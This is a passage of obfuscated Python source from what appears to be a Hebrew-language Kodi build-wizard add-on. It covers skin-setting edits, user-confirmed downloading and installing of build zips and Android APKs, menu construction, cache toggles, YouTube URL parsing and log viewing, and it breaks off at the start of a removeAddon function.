			O000O0OOO0O00OOOO .write (OO000000O000O00O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O00OO0O0OOOO0OO0O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4264
			O000O0OOO0O00OOOO .close ()#line:4265
			O0O0O000O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4269
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'r')#line:4271
			OO000000O000O00O0 =O000O0OOO0O00OOOO .read ()#line:4272
			O000O0OOO0O00OOOO .close ()#line:4273
			OO0OOO0OO0O0OOO00 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4274
			O00OO0O0OOOO0OO0O =re .compile (OO0OOO0OO0O0OOO00 ).findall (OO000000O000O00O0 )[0 ]#line:4275
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'w')#line:4276
			O000O0OOO0O00OOOO .write (OO000000O000O00O0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O00OO0O0OOOO0OO0O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4277
			O000O0OOO0O00OOOO .close ()#line:4278
			O0O0O000O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4282
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'r')#line:4284
			OO000000O000O00O0 =O000O0OOO0O00OOOO .read ()#line:4285
			O000O0OOO0O00OOOO .close ()#line:4286
			OO0OOO0OO0O0OOO00 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4287
			O00OO0O0OOOO0OO0O =re .compile (OO0OOO0OO0O0OOO00 ).findall (OO000000O000O00O0 )[0 ]#line:4288
			O000O0OOO0O00OOOO =open (O0O0O000O0OO00OOO ,'w')#line:4289
			O000O0OOO0O00OOOO .write (OO000000O000O00O0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O00OO0O0OOOO0OO0O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4290
			O000O0OOO0O00OOOO .close ()#line:4291
		except :#line:4296
			pass #line:4297
def thirdPartyInstall (OO000OO00O0O00OO0 ,OO000OO0O0O00OOOO ):#line:4299
	if not wiz .workingURL (OO000OO0O0O00OOOO ):#line:4300
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4301
	O000O0OOOOOOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000OO00O0O00OO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4302
	if O000O0OOOOOOOO0O0 ==1 :#line:4303
		freshStart ('third',True )#line:4304
	wiz .clearS ('build')#line:4305
	O0OOO0O0OO0O0O0OO =OO000OO00O0O00OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4306
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4307
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO00O0O00OO0 ),'','אנא המתן')#line:4308
	OOO000OO0OO000000 =os .path .join (PACKAGES ,'%s.zip'%O0OOO0O0OO0O0O0OO )#line:4309
	try :os .remove (OOO000OO0OO000000 )#line:4310
	except :pass #line:4311
	downloader .download (OO000OO0O0O00OOOO ,OOO000OO0OO000000 ,DP )#line:4312
	xbmc .sleep (1000 )#line:4313
	O0OOO0OO000O0OOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO00O0O00OO0 )#line:4314
	DP .update (0 ,O0OOO0OO000O0OOO0 ,'','אנא המתן')#line:4315
	OOOO00OO00O000O00 ,O0OO0000000OO0OOO ,O00O00OOO0O0OOOOO =extract .all (OOO000OO0OO000000 ,HOME ,DP ,title =O0OOO0OO000O0OOO0 )#line:4316
	if int (float (OOOO00OO00O000O00 ))>0 :#line:4317
		wiz .fixmetas ()#line:4318
		wiz .lookandFeelData ('save')#line:4319
		wiz .defaultSkin ()#line:4320
		wiz .setS ('installed','true')#line:4322
		wiz .setS ('extract',str (OOOO00OO00O000O00 ))#line:4323
		wiz .setS ('errors',str (O0OO0000000OO0OOO ))#line:4324
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO00OO00O000O00 ,O0OO0000000OO0OOO ))#line:4325
		try :os .remove (OOO000OO0OO000000 )#line:4326
		except :pass #line:4327
		if int (float (O0OO0000000OO0OOO ))>0 :#line:4328
			O000O0O0O00O0O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OO00O0O00OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO00OO00O000O00 ,'%',COLOR1 ,O0OO0000000OO0OOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4329
			if O000O0O0O00O0O0O0 :#line:4330
				if isinstance (O0OO0000000OO0OOO ,unicode ):#line:4331
					O00O00OOO0O0OOOOO =O00O00OOO0O0OOOOO .encode ('utf-8')#line:4332
				wiz .TextBox (ADDONTITLE ,O00O00OOO0O0OOOOO )#line:4333
	DP .close ()#line:4334
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4335
	if INSTALLMETHOD ==1 :OO000O000O0O00O0O =1 #line:4336
	elif INSTALLMETHOD ==2 :OO000O000O0O00O0O =0 #line:4337
	else :OO000O000O0O00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4338
	if OO000O000O0O00O0O ==1 :wiz .reloadFix ()#line:4339
	else :wiz .killxbmc (True )#line:4340
def testTheme (OOOO000OOOO00O0O0 ):#line:4342
	O0OOO0OO000OO00O0 =zipfile .ZipFile (OOOO000OOOO00O0O0 )#line:4343
	for OO00OO00OOOO0000O in O0OOO0OO000OO00O0 .infolist ():#line:4344
		if '/settings.xml'in OO00OO00OOOO0000O .filename :#line:4345
			return True #line:4346
	return False #line:4347
def testGui (O0OO0OOO0000OO000 ):#line:4349
	O0O0O0OOOO00OO00O =zipfile .ZipFile (O0OO0OOO0000OO000 )#line:4350
	for OOO0O0OOO0O000O00 in O0O0O0OOOO00OO00O .infolist ():#line:4351
		if '/guisettings.xml'in OOO0O0OOO0O000O00 .filename :#line:4352
			return True #line:4353
	return False #line:4354
def apkInstaller (OO0O0OOOOO0OOO00O ,O000000OOOOOOO00O ):#line:4356
	wiz .log (OO0O0OOOOO0OOO00O )#line:4357
	wiz .log (O000000OOOOOOO00O )#line:4358
	if wiz .platform ()=='android':#line:4359
		OOO00O000O0O00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOOOO0OOO00O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4360
		if not OOO00O000O0O00O00 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4361
		OOO0OO0OO0000O000 =OO0O0OOOOO0OOO00O #line:4362
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4363
		if not wiz .workingURL (O000000OOOOOOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4364
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0OO0000O000 ),'','אנא המתן')#line:4365
		OO000OO0000OO000O =os .path .join (PACKAGES ,"%s.apk"%OO0O0OOOOO0OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4366
		try :os .remove (OO000OO0000OO000O )#line:4367
		except :pass #line:4368
		downloader .download (O000000OOOOOOO00O ,OO000OO0000OO000O ,DP )#line:4369
		xbmc .sleep (100 )#line:4370
		DP .close ()#line:4371
		notify .apkInstaller (OO0O0OOOOO0OOO00O )#line:4372
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO000OO0000OO000O +'")')#line:4373
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4374
def createMenu (O00OOOO00OO00O0O0 ,OOOO0OO0O00000OOO ,O0O0O00000OOOOO0O ):#line:4380
	if O00OOOO00OO00O0O0 =='saveaddon':#line:4381
		O000OO0O00OO00000 =[]#line:4382
		OOO0OO00OO00OO0O0 =urllib .quote_plus (OOOO0OO0O00000OOO .lower ().replace (' ',''))#line:4383
		O000O0O000OOOOOO0 =OOOO0OO0O00000OOO .replace ('Debrid','Real Debrid')#line:4384
		OOO00OOOO0OOO0000 =urllib .quote_plus (O0O0O00000OOOOO0O .lower ().replace (' ',''))#line:4385
		O0O0O00000OOOOO0O =O0O0O00000OOOOO0O .replace ('url','URL Resolver')#line:4386
		O000OO0O00OO00000 .append ((THEME2 %O0O0O00000OOOOO0O .title (),' '))#line:4387
		O000OO0O00OO00000 .append ((THEME3 %'Save %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4388
		O000OO0O00OO00000 .append ((THEME3 %'Restore %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4389
		O000OO0O00OO00000 .append ((THEME3 %'Clear %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4390
	elif O00OOOO00OO00O0O0 =='save':#line:4391
		O000OO0O00OO00000 =[]#line:4392
		OOO0OO00OO00OO0O0 =urllib .quote_plus (OOOO0OO0O00000OOO .lower ().replace (' ',''))#line:4393
		O000O0O000OOOOOO0 =OOOO0OO0O00000OOO .replace ('Debrid','Real Debrid')#line:4394
		OOO00OOOO0OOO0000 =urllib .quote_plus (O0O0O00000OOOOO0O .lower ().replace (' ',''))#line:4395
		O0O0O00000OOOOO0O =O0O0O00000OOOOO0O .replace ('url','URL Resolver')#line:4396
		O000OO0O00OO00000 .append ((THEME2 %O0O0O00000OOOOO0O .title (),' '))#line:4397
		O000OO0O00OO00000 .append ((THEME3 %'Register %s'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4398
		O000OO0O00OO00000 .append ((THEME3 %'Save %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4399
		O000OO0O00OO00000 .append ((THEME3 %'Restore %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4400
		O000OO0O00OO00000 .append ((THEME3 %'Import %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4401
		O000OO0O00OO00000 .append ((THEME3 %'Clear Addon %s Data'%O000O0O000OOOOOO0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOO0OO00OO00OO0O0 ,OOO00OOOO0OOO0000 )))#line:4402
	elif O00OOOO00OO00O0O0 =='install':#line:4403
		O000OO0O00OO00000 =[]#line:4404
		OOO00OOOO0OOO0000 =urllib .quote_plus (O0O0O00000OOOOO0O )#line:4405
		O000OO0O00OO00000 .append ((THEME2 %O0O0O00000OOOOO0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOO00OOOO0OOO0000 )))#line:4406
		O000OO0O00OO00000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOO00OOOO0OOO0000 )))#line:4407
		O000OO0O00OO00000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOO00OOOO0OOO0000 )))#line:4408
		O000OO0O00OO00000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOO00OOOO0OOO0000 )))#line:4409
		O000OO0O00OO00000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOO00OOOO0OOO0000 )))#line:4410
	O000OO0O00OO00000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4411
	return O000OO0O00OO00000 #line:4412
def toggleCache (O00O00O00O00O0O00 ):#line:4414
	OO00OOO0000O0O0OO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4415
	OOOO00O0OO0O00OO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4416
	if O00O00O00O00O0O00 in ['true','false']:#line:4417
		for O00OOO0OO0O00O000 in OO00OOO0000O0O0OO :#line:4418
			wiz .setS (O00OOO0OO0O00O000 ,O00O00O00O00O0O00 )#line:4419
	else :#line:4420
		if not O00O00O00O00O0O00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4421
			try :#line:4422
				O00OOO0OO0O00O000 =OOOO00O0OO0O00OO0 [OO00OOO0000O0O0OO .index (O00O00O00O00O0O00 )]#line:4423
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O00OOO0OO0O00O000 ))#line:4424
			except :#line:4425
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O00O00O00O00O0O00 ))#line:4426
		else :#line:4427
			OO000O00OO00O0O0O ='true'if wiz .getS (O00O00O00O00O0O00 )=='false'else 'false'#line:4428
			wiz .setS (O00O00O00O00O0O00 ,OO000O00OO00O0O0O )#line:4429
def playVideo (O00O0OOOOOO0O0O0O ):#line:4431
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00O0OOOOOO0O0O0O )#line:4432
	if 'watch?v='in O00O0OOOOOO0O0O0O :#line:4433
		O000O0OOO0O0OO0O0 ,OOO0OOOO00OOO00OO =O00O0OOOOOO0O0O0O .split ('?')#line:4434
		OOO0O0OOO0OO0O0OO =OOO0OOOO00OOO00OO .split ('&')#line:4435
		for OO00OO0OO0OO0O0O0 in OOO0O0OOO0OO0O0OO :#line:4436
			if OO00OO0OO0OO0O0O0 .startswith ('v='):#line:4437
				O00O0OOOOOO0O0O0O =OO00OO0OO0OO0O0O0 [2 :]#line:4438
				break #line:4439
			else :continue #line:4440
	elif 'embed'in O00O0OOOOOO0O0O0O or 'youtu.be'in O00O0OOOOOO0O0O0O :#line:4441
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00O0OOOOOO0O0O0O )#line:4442
		O000O0OOO0O0OO0O0 =O00O0OOOOOO0O0O0O .split ('/')#line:4443
		if len (O000O0OOO0O0OO0O0 [-1 ])>5 :#line:4444
			O00O0OOOOOO0O0O0O =O000O0OOO0O0OO0O0 [-1 ]#line:4445
		elif len (O000O0OOO0O0OO0O0 [-2 ])>5 :#line:4446
			O00O0OOOOOO0O0O0O =O000O0OOO0O0OO0O0 [-2 ]#line:4447
	wiz .log ("YouTube URL: %s"%O00O0OOOOOO0O0O0O )#line:4448
	yt .PlayVideo (O00O0OOOOOO0O0O0O )#line:4449
def viewLogFile ():#line:4451
	O0O0O000OOO0000OO =wiz .Grab_Log (True )#line:4452
	OO00OOOO00O0000O0 =wiz .Grab_Log (True ,True )#line:4453
	OO000000OOO0O0O00 =0 ;O0O0OOOO0000O0000 =O0O0O000OOO0000OO #line:4454
	if not OO00OOOO00O0000O0 ==False and not O0O0O000OOO0000OO ==False :#line:4455
		OO000000OOO0O0O00 =DIALOG .select (ADDONTITLE ,["View %s"%O0O0O000OOO0000OO .replace (LOG ,""),"View %s"%OO00OOOO00O0000O0 .replace (LOG ,"")])#line:4456
		if OO000000OOO0O0O00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4457
	elif O0O0O000OOO0000OO ==False and OO00OOOO00O0000O0 ==False :#line:4458
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4459
		return #line:4460
	elif not O0O0O000OOO0000OO ==False :OO000000OOO0O0O00 =0 #line:4461
	elif not OO00OOOO00O0000O0 ==False :OO000000OOO0O0O00 =1 #line:4462
	O0O0OOOO0000O0000 =O0O0O000OOO0000OO if OO000000OOO0O0O00 ==0 else OO00OOOO00O0000O0 #line:4464
	OO0OO0OO0O0O00OOO =wiz .Grab_Log (False )if OO000000OOO0O0O00 ==0 else wiz .Grab_Log (False ,True )#line:4465
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O0OOOO0000O0000 ),OO0OO0OO0O0O00OOO )#line:4467
def errorChecking (log =None ,count =None ,all =None ):#line:4469
	if log ==None :#line:4470
		OOO0OO0OOOO000O00 =wiz .Grab_Log (True )#line:4471
		OO0000O00OOOO00OO =wiz .Grab_Log (True ,True )#line:4472
		if not OO0000O00OOOO00OO ==False and not OOO0OO0OOOO000O00 ==False :#line:4473
			OO0000OOOOO0OOOO0 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO0OO0OOOO000O00 .replace (LOG ,""),errorChecking (OOO0OO0OOOO000O00 ,True ,True )),"View %s: %s error(s)"%(OO0000O00OOOO00OO .replace (LOG ,""),errorChecking (OO0000O00OOOO00OO ,True ,True ))])#line:4474
			if OO0000OOOOO0OOOO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4475
		elif OOO0OO0OOOO000O00 ==False and OO0000O00OOOO00OO ==False :#line:4476
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4477
			return #line:4478
		elif not OOO0OO0OOOO000O00 ==False :OO0000OOOOO0OOOO0 =0 #line:4479
		elif not OO0000O00OOOO00OO ==False :OO0000OOOOO0OOOO0 =1 #line:4480
		log =OOO0OO0OOOO000O00 if OO0000OOOOO0OOOO0 ==0 else OO0000O00OOOO00OO #line:4481
	if log ==False :#line:4482
		if count ==None :#line:4483
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4484
			return False #line:4485
		else :#line:4486
			return 0 #line:4487
	else :#line:4488
		if os .path .exists (log ):#line:4489
			O00OO0O0O0OO00OO0 =open (log ,mode ='r');O0OO0000OO00O0O00 =O00OO0O0O0OO00OO0 .read ().replace ('\n','').replace ('\r','');O00OO0O0O0OO00OO0 .close ()#line:4490
			O0O0OOOO00OO000OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OO0000OO00O0O00 )#line:4491
			if not count ==None :#line:4492
				if all ==None :#line:4493
					OOO000OO00O0O0OO0 =0 #line:4494
					for OOO00O00OOOOOO000 in O0O0OOOO00OO000OO :#line:4495
						if ADDON_ID in OOO00O00OOOOOO000 :OOO000OO00O0O0OO0 +=1 #line:4496
					return OOO000OO00O0O0OO0 #line:4497
				else :return len (O0O0OOOO00OO000OO )#line:4498
			if len (O0O0OOOO00OO000OO )>0 :#line:4499
				OOO000OO00O0O0OO0 =0 ;O0O0O0OO000O00O00 =""#line:4500
				for OOO00O00OOOOOO000 in O0O0OOOO00OO000OO :#line:4501
					if all ==None and not ADDON_ID in OOO00O00OOOOOO000 :continue #line:4502
					else :#line:4503
						OOO000OO00O0O0OO0 +=1 #line:4504
						O0O0O0OO000O00O00 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO000OO00O0O0OO0 ,OOO00O00OOOOOO000 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4505
				if OOO000OO00O0O0OO0 >0 :#line:4506
					wiz .TextBox (ADDONTITLE ,O0O0O0OO000O00O00 )#line:4507
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4508
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4509
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4510
ACTION_PREVIOUS_MENU =10 #line:4512
ACTION_NAV_BACK =92 #line:4513
ACTION_MOVE_LEFT =1 #line:4514
ACTION_MOVE_RIGHT =2 #line:4515
ACTION_MOVE_UP =3 #line:4516
ACTION_MOVE_DOWN =4 #line:4517
ACTION_MOUSE_WHEEL_UP =104 #line:4518
ACTION_MOUSE_WHEEL_DOWN =105 #line:4519
ACTION_MOVE_MOUSE =107 #line:4520
ACTION_SELECT_ITEM =7 #line:4521
ACTION_BACKSPACE =110 #line:4522
ACTION_MOUSE_LEFT_CLICK =100 #line:4523
ACTION_MOUSE_LONG_CLICK =108 #line:4524
def LogViewer (default =None ):#line:4526
	class OO0OOOO0OOOO0OO0O (xbmcgui .WindowXMLDialog ):#line:4527
		def __init__ (OOO00OOOOOOOOO000 ,*OO00OO0OOOOOOOO00 ,**OO00O0O0O0OO0O00O ):#line:4528
			OOO00OOOOOOOOO000 .default =OO00O0O0O0OO0O00O ['default']#line:4529
		def onInit (OOO0O00O0O0OO0000 ):#line:4531
			OOO0O00O0O0OO0000 .title =101 #line:4532
			OOO0O00O0O0OO0000 .msg =102 #line:4533
			OOO0O00O0O0OO0000 .scrollbar =103 #line:4534
			OOO0O00O0O0OO0000 .upload =201 #line:4535
			OOO0O00O0O0OO0000 .kodi =202 #line:4536
			OOO0O00O0O0OO0000 .kodiold =203 #line:4537
			OOO0O00O0O0OO0000 .wizard =204 #line:4538
			OOO0O00O0O0OO0000 .okbutton =205 #line:4539
			OO00OOO0OOO0000O0 =open (OOO0O00O0O0OO0000 .default ,'r')#line:4540
			OOO0O00O0O0OO0000 .logmsg =OO00OOO0OOO0000O0 .read ()#line:4541
			OO00OOO0OOO0000O0 .close ()#line:4542
			OOO0O00O0O0OO0000 .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O00O0O0OO0000 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4543
			OOO0O00O0O0OO0000 .showdialog ()#line:4544
		def showdialog (OOOO00O00000O00O0 ):#line:4546
			OOOO00O00000O00O0 .getControl (OOOO00O00000O00O0 .title ).setLabel (OOOO00O00000O00O0 .titlemsg )#line:4547
			OOOO00O00000O00O0 .getControl (OOOO00O00000O00O0 .msg ).setText (wiz .highlightText (OOOO00O00000O00O0 .logmsg ))#line:4548
			OOOO00O00000O00O0 .setFocusId (OOOO00O00000O00O0 .scrollbar )#line:4549
		def onClick (OOO0OO00OO0OO00O0 ,O0OO0OO0000OO00O0 ):#line:4551
			if O0OO0OO0000OO00O0 ==OOO0OO00OO0OO00O0 .okbutton :OOO0OO00OO0OO00O0 .close ()#line:4552
			elif O0OO0OO0000OO00O0 ==OOO0OO00OO0OO00O0 .upload :OOO0OO00OO0OO00O0 .close ();uploadLog .Main ()#line:4553
			elif O0OO0OO0000OO00O0 ==OOO0OO00OO0OO00O0 .kodi :#line:4554
				O000O0000OO000OOO =wiz .Grab_Log (False )#line:4555
				OO0O0OO0O0000O0OO =wiz .Grab_Log (True )#line:4556
				if O000O0000OO000OOO ==False :#line:4557
					OOO0OO00OO0OO00O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4558
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .msg ).setText ("Log File Does Not Exists!")#line:4559
				else :#line:4560
					OOO0OO00OO0OO00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OO0O0000O0OO .replace (LOG ,''))#line:4561
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .title ).setLabel (OOO0OO00OO0OO00O0 .titlemsg )#line:4562
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .msg ).setText (wiz .highlightText (O000O0000OO000OOO ))#line:4563
					OOO0OO00OO0OO00O0 .setFocusId (OOO0OO00OO0OO00O0 .scrollbar )#line:4564
			elif O0OO0OO0000OO00O0 ==OOO0OO00OO0OO00O0 .kodiold :#line:4565
				O000O0000OO000OOO =wiz .Grab_Log (False ,True )#line:4566
				OO0O0OO0O0000O0OO =wiz .Grab_Log (True ,True )#line:4567
				if O000O0000OO000OOO ==False :#line:4568
					OOO0OO00OO0OO00O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4569
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .msg ).setText ("Log File Does Not Exists!")#line:4570
				else :#line:4571
					OOO0OO00OO0OO00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OO0O0000O0OO .replace (LOG ,''))#line:4572
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .title ).setLabel (OOO0OO00OO0OO00O0 .titlemsg )#line:4573
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .msg ).setText (wiz .highlightText (O000O0000OO000OOO ))#line:4574
					OOO0OO00OO0OO00O0 .setFocusId (OOO0OO00OO0OO00O0 .scrollbar )#line:4575
			elif O0OO0OO0000OO00O0 ==OOO0OO00OO0OO00O0 .wizard :#line:4576
				O000O0000OO000OOO =wiz .Grab_Log (False ,False ,True )#line:4577
				OO0O0OO0O0000O0OO =wiz .Grab_Log (True ,False ,True )#line:4578
				if O000O0000OO000OOO ==False :#line:4579
					OOO0OO00OO0OO00O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4580
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .msg ).setText ("Log File Does Not Exists!")#line:4581
				else :#line:4582
					OOO0OO00OO0OO00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OO0O0000O0OO .replace (ADDONDATA ,''))#line:4583
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .title ).setLabel (OOO0OO00OO0OO00O0 .titlemsg )#line:4584
					OOO0OO00OO0OO00O0 .getControl (OOO0OO00OO0OO00O0 .msg ).setText (wiz .highlightText (O000O0000OO000OOO ))#line:4585
					OOO0OO00OO0OO00O0 .setFocusId (OOO0OO00OO0OO00O0 .scrollbar )#line:4586
		def onAction (OOOO000000OO0OO0O ,OOOOOOO000O0OO000 ):#line:4588
			if OOOOOOO000O0OO000 ==ACTION_PREVIOUS_MENU :OOOO000000OO0OO0O .close ()#line:4589
			elif OOOOOOO000O0OO000 ==ACTION_NAV_BACK :OOOO000000OO0OO0O .close ()#line:4590
	if default ==None :default =wiz .Grab_Log (True )#line:4591
	OO0OO0OOO000O00O0 =OO0OOOO0OOOO0OO0O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4592
	OO0OO0OOO000O00O0 .doModal ()#line:4593
	del OO0OO0OOO000O00O0 #line:4594
def removeAddon (O0O0O0O0000O0OO0O ,OOO0O00OOO000O0O0 ,over =False ):#line:4596
	if not over ==False :#line:4597
		OO0O0OO00O000O00O =1 #line:4598
	else :#line:4599
